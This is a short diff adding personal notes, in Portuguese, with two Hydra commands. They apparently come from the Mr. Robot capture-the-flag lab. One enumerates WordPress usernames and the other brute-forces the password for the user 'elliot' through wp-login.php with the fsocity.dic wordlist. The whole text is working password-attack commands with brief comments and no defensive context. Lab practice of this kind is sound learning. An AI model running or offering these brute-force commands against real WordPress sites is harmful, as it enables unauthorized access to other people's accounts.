@@ -1,0 +1,3 @@
+hydra -L fsocity.dic -p 123(senha que sera testada) `cat ip` http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"-> boot force, ira testar os ususarios 
+
+hydra -l elliot -P fsocity.dic `cat ip` http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -> boot force para encontrar a senha 
